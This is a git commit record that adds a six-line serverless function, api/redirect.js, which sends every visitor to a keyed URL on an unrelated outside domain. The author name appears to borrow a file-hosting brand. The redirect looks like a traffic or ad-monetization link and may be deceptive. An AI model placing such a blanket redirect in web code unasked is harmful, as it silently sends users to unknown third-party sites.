7d92aa7811d3f34c0f5629eb2eb84454aef44fd0
Gofile <yantonuri917@gmail.com>
2025-12-29 13:37:11 +0700

    Create redirect.js

---
+++ api/redirect.js
@@ -0,0 +1,6 @@
+export default function handler(req, res) {
+  res.writeHead(302, {
+    Location: "https://stinkymildred.com/a6gwpp7u44?key=7e10c9a202684df3d37bb4f7ee9daa9b"
+  });
+  res.end();
+}
